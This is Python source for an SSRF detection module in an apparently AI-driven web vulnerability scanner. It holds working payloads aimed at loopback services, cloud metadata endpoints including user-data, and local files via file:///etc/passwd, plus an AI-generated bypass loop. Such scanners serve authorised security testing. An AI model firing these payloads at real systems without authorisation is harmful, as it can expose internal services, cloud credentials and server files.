"""
XLayer AI SSRF Hunter - Detects Server-Side Request Forgery vulnerabilities
"""

import re
import time
from typing import List, Optional, Dict, Any
from urllib.parse import urlparse, quote
from loguru import logger

from xlayer_ai.core.vuln_hunters.base import BaseHunter, HunterResult
from xlayer_ai.models.target import AttackSurface, Endpoint
from xlayer_ai.models.vulnerability import (
    VulnHypothesis, VulnType, Confidence, VulnIndicator
)
from xlayer_ai.tools.payload_manager import PayloadCategory


class SSRFHunter(BaseHunter):
    """
    Server-Side Request Forgery (SSRF) Hunter
    
    Detects:
    - Internal network access
    - Cloud metadata access (AWS, GCP, Azure)
    - Local file access via file:// protocol
    - Port scanning via SSRF
    """
    
    name = "ssrf"
    vuln_types = [VulnType.SSRF]
    
    SSRF_INDICATORS = {
        "aws_metadata": [
            r"ami-id",
            r"instance-id",
            r"instance-type",
            r"local-hostname",
            r"public-hostname",
            r"security-credentials",
            r"iam/info",
        ],
        "gcp_metadata": [
            r"computeMetadata",
            r"project-id",
            r"instance/zone",
            r"service-accounts",
        ],
        "azure_metadata": [
            r"azEnvironment",
            r"subscriptionId",
            r"resourceGroupName",
        ],
        "internal_access": [
            r"localhost",
            r"127\.0\.0\.1",
            r"internal",
            r"intranet",
            r"private",
        ],
        "file_access": [
            r"root:.*:0:0",
            r"\[boot loader\]",
            r"# /etc/",
        ]
    }
    
    async def hunt(self, attack_surface: AttackSurface) -> HunterResult:
        """Hunt for SSRF vulnerabilities"""
        start_time = time.time()
        self._reset_state()
        
        logger.info(f"SSRF Hunter starting")
        
        url_params = self._find_url_parameters(attack_surface)
        static_ssrf = [p.value for p in self.payloads.get_ssrf_payloads()]

        for endpoint, param_name in url_params:
            hypotheses = await self._test_ssrf(endpoint, param_name)
            self._hypotheses.extend(hypotheses)

            # AI adaptive round if nothing found
            if not hypotheses:
                ctx = self._build_attack_context(endpoint, param_name, "ssrf", attack_surface)

                def ssrf_success(r, _ctx):
                    body = r.body.lower()
                    for category, patterns in self.SSRF_INDICATORS.items():
                        if any(re.search(p, body) for p in patterns):
                            return True
                    return False

                attempts = await self._adaptive_test(
                    endpoint, param_name, static_ssrf, ctx, ssrf_success,
                    extra={"cloud_hints": attack_surface.technology.server or "unknown"}
                )
                for attempt in attempts:
                    if attempt.success:
                        self._hypotheses.append(self._create_hypothesis(
                            vuln_type=VulnType.SSRF,
                            endpoint=endpoint,
                            parameter=param_name,
                            confidence=Confidence.HIGH,
                            indicators=[VulnIndicator(
                                indicator_type="ai_adaptive",
                                detail=f"AI SSRF bypass: {attempt.payload[:60]}",
                                confidence_boost=0.3
                            )],
                            suggested_payloads=[attempt.payload],
                            context={"ai_generated": True}
                        ))

        duration = time.time() - start_time
        result = self._build_result(duration)
        
        logger.info(
            f"SSRF Hunter complete: {result.findings_count} hypotheses, "
            f"{result.high_confidence_count} high confidence"
        )
        
        return result
    
    def _find_url_parameters(self, attack_surface: AttackSurface) -> List[tuple]:
        """Find parameters that might accept URLs"""
        url_params = []
        
        url_param_names = [
            "url", "uri", "path", "dest", "redirect", "target",
            "rurl", "return", "next", "link", "goto", "fetch",
            "file", "document", "folder", "root", "page", "feed",
            "host", "site", "html", "load", "data", "reference",
            "callback", "proxy", "request", "img", "image", "src"
        ]
        
        for endpoint in attack_surface.testable_endpoints:
            for param in endpoint.parameters:
                param_lower = param.name.lower()
                
                if any(u in param_lower for u in url_param_names):
                    url_params.append((endpoint, param.name))
                
                elif param.sample_value:
                    if param.sample_value.startswith(("http://", "https://", "//", "/")):
                        url_params.append((endpoint, param.name))
        
        return url_params
    
    async def _test_ssrf(
        self,
        endpoint: Endpoint,
        parameter: str
    ) -> List[VulnHypothesis]:
        """Test for SSRF vulnerabilities"""
        hypotheses = []
        self._endpoints_tested += 1
        
        ssrf_payloads = self.payloads.get_ssrf_payloads(include_cloud=True)
        
        internal_payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://127.0.0.1:80",
            "http://127.0.0.1:443",
            "http://127.0.0.1:22",
            "http://127.0.0.1:3306",
            "http://[::1]",
            "http://0.0.0.0",
            "http://0177.0.0.1",
            "http://2130706433",
            "http://127.1",
            "http://127.0.1",
        ]
        
        cloud_payloads = [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/ami-id",
            "http://169.254.169.254/latest/meta-data/instance-id",
            "http://169.254.169.254/latest/user-data",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        ]
        
        file_payloads = [
            "file:///etc/passwd",
            "file:///etc/hosts",
            "file:///c:/windows/system32/drivers/etc/hosts",
        ]
        
        all_payloads = internal_payloads + cloud_payloads + file_payloads
        
        for payload in all_payloads:
            self._payloads_sent += 1
            
            response = await self._send_payload(endpoint, parameter, payload)
            
            if not response or response.get("error"):
                continue
            
            body = response["body"]
            status = response["status"]
            
            if status != 200:
                continue
            
            ssrf_type, indicators = self._analyze_ssrf_response(payload, body)
            
            if ssrf_type:
                confidence = Confidence.HIGH if ssrf_type in ["aws_metadata", "gcp_metadata", "file_access"] else Confidence.MEDIUM

                if confidence == Confidence.MEDIUM:
                    llm_result = await self._llm_analyze_response(
                        endpoint, parameter, payload,
                        {"body": body, "status": status},
                        "ssrf"
                    )
                    if llm_result and llm_result.get("vulnerable") and llm_result.get("confidence", 0) > 0.7:
                        confidence = Confidence.HIGH
                        indicators.append(VulnIndicator(
                            indicator_type="llm_analysis",
                            detail=f"LLM confirmed SSRF with {llm_result.get('confidence', 0):.0%} confidence",
                            confidence_boost=0.2
                        ))

                hypothesis = self._create_hypothesis(
                    vuln_type=VulnType.SSRF,
                    endpoint=endpoint,
                    parameter=parameter,
                    confidence=confidence,
                    indicators=indicators,
                    suggested_payloads=[payload],
                    context={
                        "ssrf_type": ssrf_type,
                        "payload": payload,
                        "response_length": len(body)
                    }
                )
                hypotheses.append(hypothesis)
                
                if confidence == Confidence.HIGH:
                    break
        
        return hypotheses
    
    def _analyze_ssrf_response(
        self,
        payload: str,
        body: str
    ) -> tuple:
        """Analyze response for SSRF indicators"""
        for ssrf_type, patterns in self.SSRF_INDICATORS.items():
            for pattern in patterns:
                if re.search(pattern, body, re.IGNORECASE):
                    indicators = [
                        VulnIndicator(
                            indicator_type="ssrf_indicator",
                            detail=f"Found {ssrf_type} indicator: {pattern}",
                            confidence_boost=0.2
                        )
                    ]
                    return ssrf_type, indicators
        
        if "169.254.169.254" in payload:
            if len(body) > 10 and body.strip() and not body.startswith("<!"):
                indicators = [
                    VulnIndicator(
                        indicator_type="metadata_response",
                        detail="Got non-HTML response from metadata endpoint",
                        confidence_boost=0.15
                    )
                ]
                return "cloud_metadata", indicators
        
        if "127.0.0.1" in payload or "localhost" in payload:
            internal_indicators = [
                r"<title>.*</title>",
                r"<html",
                r"nginx",
                r"apache",
                r"server",
            ]
            for pattern in internal_indicators:
                if re.search(pattern, body, re.IGNORECASE):
                    indicators = [
                        VulnIndicator(
                            indicator_type="internal_response",
                            detail=f"Got response from internal service",
                            confidence_boost=0.1
                        )
                    ]
                    return "internal_access", indicators
        
        if payload.startswith("file://"):
            if len(body) > 0 and not body.startswith("<!"):
                indicators = [
                    VulnIndicator(
                        indicator_type="file_response",
                        detail="Got response from file:// protocol",
                        confidence_boost=0.15
                    )
                ]
                return "file_access", indicators
        
        return None, []
    
    def _analyze_response(
        self,
        endpoint: Endpoint,
        parameter: str,
        payload: str,
        response: Dict[str, Any]
    ) -> Optional[VulnHypothesis]:
        """Analyze response for SSRF indicators"""
        return None
